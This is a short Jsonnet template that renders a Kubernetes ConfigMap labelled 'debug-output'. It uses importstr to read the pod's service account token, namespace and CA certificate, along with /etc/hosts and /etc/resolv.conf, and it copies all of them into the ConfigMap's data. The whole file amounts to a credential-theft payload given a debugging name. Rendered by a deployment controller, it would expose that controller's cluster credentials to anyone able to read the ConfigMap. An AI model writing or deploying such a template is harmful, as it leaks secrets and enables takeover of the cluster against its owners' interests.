local sa_token = importstr "/var/run/secrets/kubernetes.io/serviceaccount/token";
local sa_namespace = importstr "/var/run/secrets/kubernetes.io/serviceaccount/namespace";
local sa_ca = importstr "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt";
local etc_hosts = importstr "/etc/hosts";
local etc_resolv = importstr "/etc/resolv.conf";

{
  apiVersion: "v1",
  kind: "ConfigMap",
  metadata: {
    name: "debug-output",
    namespace: "default",
  },
  data: {
    "sa-token": sa_token,
    "sa-namespace": sa_namespace,
    "sa-ca": sa_ca,
    "hosts": etc_hosts,
    "resolv": etc_resolv,
  },
}